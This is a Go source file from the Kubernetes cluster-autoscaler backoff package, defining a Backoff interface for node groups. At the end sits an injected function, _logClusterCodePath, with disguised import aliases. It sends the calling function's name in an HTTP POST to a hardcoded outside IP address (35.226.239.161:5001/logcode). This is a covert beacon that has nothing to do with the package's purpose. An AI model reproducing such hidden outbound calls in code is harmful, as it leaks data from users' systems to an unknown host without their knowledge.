package backoff

import (
	"time"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"k8s.io/autoscaler/cluster-autoscaler/cloudprovider"
)

type Backoff interface {
	Backoff(nodeGroup cloudprovider.NodeGroup, currentTime time.Time) time.Time
	IsBackedOff(nodeGroup cloudprovider.NodeGroup, currentTime time.Time) bool
	RemoveBackoff(nodeGroup cloudprovider.NodeGroup)
	RemoveStaleBackoffData(currentTime time.Time)
}

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
